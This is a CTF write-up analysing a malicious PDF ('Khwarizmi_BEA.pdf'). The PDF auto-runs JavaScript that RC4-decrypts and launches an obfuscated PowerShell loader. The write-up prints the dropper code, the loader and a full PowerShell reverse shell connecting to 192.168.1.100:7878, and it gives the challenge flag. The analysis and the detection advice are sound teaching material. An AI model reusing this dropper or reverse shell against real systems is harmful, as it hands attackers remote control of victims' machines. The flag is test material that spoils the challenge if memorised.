# Cyber-eto Qualifications 2025 - PDF Malware Analysis CTF Challenge Writeup

## Challenge Description

**Challenge Name:** Just PDF  
**Category:** Malware Analysis/Forensics  
**Flag Format:** `cybereto{IP_PortNumber}`

A member of Cyber-eto accounting team inadvertently executed a malicious payload after opening a PDF file, which was disguised as information about Al-Khwarizmi and received from a personal contact.

**Flag example:** `cybereto{192.168.1.1_4325}`

## Initial Analysis

The challenge provides a single PDF file named `Khwarizmi_BEA.pdf`. Let's start by examining the file structure and basic information:

```bash
$ ls -la
total 312
drwxr-xr-x   3 laith  staff      96  1 تشرين الثاني 13:03 .
drwxr-xr-x  11 laith  staff     352  1 تشرين الثاني 13:03 ..
-rw-r--r--@  1 laith  staff  157778  1 تشرين الثاني 13:03 Khwarizmi_BEA.pdf

$ file Khwarizmi_BEA.pdf
Khwarizmi_BEA.pdf: PDF document, version 1.4, 4 pages
```

The file appears to be a legitimate 4-page PDF document. However, given the challenge context, we need to investigate deeper for embedded malicious content.

## PDF Structure Analysis

### Step 1: Examining PDF Objects

Let's search for potentially malicious content patterns within the PDF:

```bash
$ strings Khwarizmi_BEA.pdf | grep -i -A5 -B5 "javascript\|action\|openaction\|launch"
1 0 obj
/Pages 2 0 R
/Type /Catalog
/PageLabels 3 0 R
/Metadata 4 0 R
/OpenAction 5 0 R
endobj
--
5 0 obj
/Type /Action
/S /JavaScript
/JS <766172205061796C...>
endobj
```

🎯 **First Discovery!** The PDF contains:
1. An `OpenAction` that automatically executes when the PDF is opened
2. A JavaScript action (`/S /JavaScript`) with hex-encoded content

### Step 2: JavaScript Payload Extraction

The JavaScript content is hex-encoded. Let's extract and decode it:

```bash
$ strings Khwarizmi_BEA.pdf | grep -A 50 "rc4Buffer"
```

The hex string starts with `766172205061796C6F61645F446174613D...` which is a massive encoded JavaScript payload.

## JavaScript Analysis and Decryption

### Step 3: Decoding the Hex-Encoded JavaScript

Converting the hex to ASCII reveals JavaScript code with an RC4-encrypted payload:

```javascript
var Payload_Data= [136, 216, 185, 28, 28, 81, 209, 14, 35, 89, 150, 197, 220, 78, 155, 214, // ... 2073 bytes total

function rc4Buffer(key, data) {
    var s = [];
    for (var i = 0; i < 256; i++) s[i] = i;
    var j = 0;
    for (var i = 0; i < 256; i++) {
        j = (j + s[i] + key.charCodeAt(i % key.length)) & 0xff;
        var tmp = s[i]; s[i] = s[j]; s[j] = tmp;
    }

    var i = 0, j = 0;
    var result = [];
    for (var k = 0; k < data.length; k++) {
        i = (i + 1) & 0xff;
        j = (j + s[i]) & 0xff;
        var tmp2 = s[i]; s[i] = s[j]; s[j] = tmp2;
        var rnd = s[(s[i] + s[j]) & 0xff];
        result[k] = data[k] ^ rnd;
    }
    return result;
}

function bytesToString(bytes) {
    var str = "";
    for (var i = 0; i < bytes.length; i++) {
        str += String.fromCharCode(bytes[i]);
    }
    return str;
}

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");

var key = "Hello World";
var decryptedArr = rc4Buffer(key, Payload_Data);
var plainText = bytesToString(decryptedArr);
var tempFile = fso.GetSpecialFolder(2) + "\\tempScript.ps1"; 
var file = fso.CreateTextFile(tempFile, true, true); 
file.Write(plainText);
file.Close();
shell.Run('powershell -NoProfile -ExecutionPolicy Bypass -File "' + tempFile + '"', 1, true);
```

### Step 4: RC4 Decryption

The JavaScript uses RC4 encryption with the key `"Hello World"` to decrypt a PowerShell payload. Let's implement the decryption:

```python
def rc4_buffer(key, data):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + ord(key[i % len(key)])) & 0xff
        s[i], s[j] = s[j], s[i]
    
    i = j = 0
    result = []
    for k in range(len(data)):
        i = (i + 1) & 0xff
        j = (j + s[i]) & 0xff
        s[i], s[j] = s[j], s[i]
        rnd = s[(s[i] + s[j]) & 0xff]
        result.append(data[k] ^ rnd)
    
    return result

# Decrypt the payload
key = "Hello World"
payload_data = [136, 216, 185, 28, 28, 81, 209, 14, ...] # 2073 bytes
decrypted_bytes = rc4_buffer(key, payload_data)
decrypted_text = ''.join([chr(b) for b in decrypted_bytes])
```

## PowerShell Payload Analysis

### Step 5: Decrypted PowerShell Script

The decrypted payload reveals a heavily obfuscated PowerShell script:

```powershell
$best64code = "K0QKoU2cvx2QuQnbllGbjRiCN0nCNkCKoNXdsZkLtFWZyR3ckACIgAiCNkCa0dmblxkLlRXeiRmblNHJgwCMgwSZ0lnYk5WZzRCKlRXaydlLtFWZyR3ckACIgAiCNkiMrNWYiRmblNHJoMXZ0lnQ0V2RucmbpR2bj5WZkASPgUGd5JGZuV2ckACIgAiCNICI+ICIrACa0FGUukCZ3BHKgsCIiAyUQJCIrAyajFmYk5WZzRCI9AiMrNWYiRmblNHJgACIgoQDpAyZulmc0NVL0V3TgwHIxYiPyASY0FGZkACellGKg0DIrNWYiRmblNHJgACIgoQDpkGJgwCMgwiclZmZ1JGJocmbpJHdTRXZH5yZulGZvNmblRCI9ASY0FGZkACIgAiCNsHIpADIl5WLgkSKoR3ZuVGTuIXZmZWdiRCIsADIsIXZmZWdiRCKkFWZS5SbhVmc0NHJg0DIpRCKoASZslGa3pQDK0wZulGZvNmbFlUSDNVQuQHelRlLtVGdzl3UgQ3YlpmYP1ydl5EI9AyZulGZvNmblRiCNQjMwEDIdtVZ0lnYgQ3YlpmYP1ydl5EI9AiclZmZ1JGJK0QKtFWZyR3ckgiclRXaydVbhVmc0NlLPlkLtVGdzl3UgQ3YlpmYP1ydl5EI9AiclRXaydHJK0QKo0WYlJHdTRXZH5CduVWasNGJg0DItFWZyR3ckoQDpQncvBHJgwiIwATMuEjL4YTMuITOxICK05WZpx2QQNEVuMHdlt2YvNlL0VmTu0WZ0NXeTBCdjVmai9UL3VmTg0DI05WZpx2YkoQD4cDO3ASPgQncvBHJ" ;
$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; $Stripped = -join $base64 ;
$Padded = switch ($Stripped.Length % 4) { 0 { $Stripped }; 1 { $Stripped.Substring(0, $Stripped.Length - 1) }; 2 { $Stripped + ("=" * 2) }; 3 { $Stripped + "=" }} ;
$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Padded)) ;
$RandomSTR64 = '42bJN3UFJHc4VWLlt2bW5Wa'.ToCharArray() ; [array]::Reverse($RandomSTR64) ; $iexbase64 = -join $RandomSTR64 ;
$iexbase64 = switch ($iexbase64.Length % 4) { 0 { $iexbase64 }; 1 { $iexbase64.Substring(0, $iexbase64.Length - 1) }; 2 { $iexbase64 + '=' * 2 }; 3 { $iexbase64 + '=' } } ;
$iexcmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iexbase64)) ;
$aliasSTR64 = 'gUldTU'.ToCharArray() ; [array]::Reverse($aliasSTR64) ; $aliasbase = -join $aliasSTR64 ;
$aliasbase = switch ($aliasbase.Length % 4) { 0 { $aliasbase }; 1 { $aliasbase.Substring(0, $aliasbase.Length - 1) }; 2 { $aliasbase + '=' * 2 }; 3 { $aliasbase + '=' } } ;
$aliasFinal = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($aliasbase)) ;
$nULl = neW-ALiAs -Name $aLiASFINAl -VaLuE $IeXcMd -fORCe ; & $alIaSFiNal $LoadcoDe ;
```

This script employs multiple layers of base64 obfuscation with string reversal.

### Step 6: Deobfuscating the PowerShell

Let's decode each base64 string step by step:

#### Main Base64 Payload
```python
best64code = "K0QKoU2cvx2QuQnbllGbjRiCN0nCNkCKoNXdsZkLtFWZyR3ckACIgAiCNkCa0dmblxkLlRXeiRmblNHJgwCMgwSZ0lnYk5WZzRCKlRXaydlLtFWZyR3ckACIgAiCNkiMrNWYiRmblNHJoMXZ0lnQ0V2RucmbpR2bj5WZkASPgUGd5JGZuV2ckACIgAiCNICI+ICIrACa0FGUukCZ3BHKgsCIiAyUQJCIrAyajFmYk5WZzRCI9AiMrNWYiRmblNHJgACIgoQDpAyZulmc0NVL0V3TgwHIxYiPyASY0FGZkACellGKg0DIrNWYiRmblNHJgACIgoQDpkGJgwCMgwiclZmZ1JGJocmbpJHdTRXZH5yZulGZvNmblRCI9ASY0FGZkACIgAiCNsHIpADIl5WLgkSKoR3ZuVGTuIXZmZWdiRCIsADIsIXZmZWdiRCKkFWZS5SbhVmc0NHJg0DIpRCKoASZslGa3pQDK0wZulGZvNmbFlUSDNVQuQHelRlLtVGdzl3UgQ3YlpmYP1ydl5EI9AyZulGZvNmblRiCNQjMwEDIdtVZ0lnYgQ3YlpmYP1ydl5EI9AiclZmZ1JGJK0QKtFWZyR3ckgiclRXaydVbhVmc0NlLPlkLtVGdzl3UgQ3YlpmYP1ydl5EI9AiclRXaydHJK0QKo0WYlJHdTRXZH5CduVWasNGJg0DItFWZyR3ckoQDpQncvBHJgwiIwATMuEjL4YTMuITOxICK05WZpx2QQNEVuMHdlt2YvNlL0VmTu0WZ0NXeTBCdjVmai9UL3VmTg0DI05WZpx2YkoQD4cDO3ASPgQncvBHJ"

# Reverse the string
reversed_str = best64code[::-1]

# Handle base64 padding and decode
padded = fix_base64_padding(reversed_str)
decoded_main = base64.b64decode(padded).decode('utf-8')
```

🎯 **Second Discovery!** The decoded main payload reveals the actual malicious code:

```powershell
$port = 7878
$client = New-Object System.Net.Sockets.TCPClient("192.168.1.100", $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = $encoding.GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

#### Other Obfuscated Strings
```python
# IEX command ('42bJN3UFJHc4VWLlt2bW5Wa' reversed and decoded)
RandomSTR64 = '42bJN3UFJHc4VWLlt2bW5Wa'[::-1]
decoded_iex = base64.b64decode(fix_base64_padding(RandomSTR64)).decode('utf-8')
# Result: "inVoke-exprESsIon"

# Alias ('gUldTU' reversed and decoded)  
aliasSTR64 = 'gUldTU'[::-1]
decoded_alias = base64.b64decode(fix_base64_padding(aliasSTR64)).decode('utf-8')
# Result: "Q7eR"
```

## Network Indicators Extraction

### Step 7: Identifying Command & Control Infrastructure

From the deobfuscated PowerShell code, we can extract the network indicators:

- **IP Address**: `192.168.1.100`
- **Port**: `7878`
- **Protocol**: TCP
- **Purpose**: Reverse shell connection

The malicious payload establishes a reverse shell that:
1. Connects to the attacker's server at `192.168.1.100:7878`
2. Reads commands from the network connection
3. Executes them using `Invoke-Expression` (iex)
4. Sends the output back to the attacker
5. Maintains a persistent shell prompt

## Flag Assembly

Based on the challenge format `cybereto{IP_PortNumber}` and our findings:

- **IP Address**: `192.168.1.100`
- **Port**: `7878`

## Final Flag

**Flag:** `cybereto{192.168.1.100_7878}`

## Attack Flow Summary

1. **Initial Vector**: Malicious PDF file disguised as Al-Khwarizmi information
2. **Trigger**: PDF automatically executes JavaScript on opening (`OpenAction`)
3. **Stage 1**: JavaScript decrypts RC4-encrypted PowerShell payload using key "Hello World"
4. **Stage 2**: PowerShell script writes decrypted content to temp file and executes it
5. **Stage 3**: Final payload connects back to attacker's C2 server for remote access
6. **Persistence**: Maintains interactive shell session for command execution

## Key Lessons Learned

This challenge demonstrates several important security concepts:

1. **PDF Malware**: PDFs can contain embedded JavaScript that executes automatically when opened
2. **Multi-Stage Payloads**: Modern malware uses multiple layers of encoding/encryption to evade detection
3. **Living Off the Land**: The attack uses legitimate Windows tools (WScript, PowerShell) for malicious purposes
4. **RC4 Encryption**: Simple encryption algorithms are still used to obfuscate payloads
5. **Reverse Shells**: Common technique for maintaining persistent access to compromised systems

## Tools and Techniques Used

- **Static Analysis**: File type identification and strings extraction
- **JavaScript Analysis**: Hex decoding and code structure examination  
- **Cryptographic Analysis**: RC4 decryption implementation
- **PowerShell Deobfuscation**: Base64 decoding and string manipulation reversal
- **Network Indicator Extraction**: Pattern recognition for IP addresses and ports
- **Malware Behavior Analysis**: Understanding attack flow and payload functionality

## Detection and Prevention

### Detection Indicators
- **File Hash**: SHA256 of `Khwarizmi_BEA.pdf`
- **Network IOCs**: Connections to `192.168.1.100:7878`
- **Process IOCs**: Suspicious PowerShell execution with bypass flags
- **File IOCs**: Temporary `.ps1` files in `%TEMP%` directory

### Prevention Measures
1. **PDF Security**: Disable JavaScript execution in PDF readers
2. **Endpoint Protection**: Monitor for suspicious PowerShell execution
3. **Network Monitoring**: Detect unusual outbound connections
4. **User Training**: Awareness about malicious email attachments
5. **Application Control**: Restrict PowerShell execution policies

## Timeline of Investigation

1. **File Identification**: Recognized PDF document with potential malicious content
2. **Structure Analysis**: Examined PDF objects and found OpenAction with JavaScript
3. **JavaScript Extraction**: Decoded hex-encoded JavaScript payload
4. **RC4 Decryption**: Implemented decryption algorithm to reveal PowerShell script
5. **Deobfuscation**: Decoded multiple layers of base64 encoding with string reversal
6. **Network Analysis**: Extracted C2 server IP address and port number
7. **Flag Construction**: Assembled final flag according to specified format

This challenge excellently demonstrates the complexity of modern malware analysis and the importance of understanding multiple obfuscation techniques used by attackers to hide their true intentions.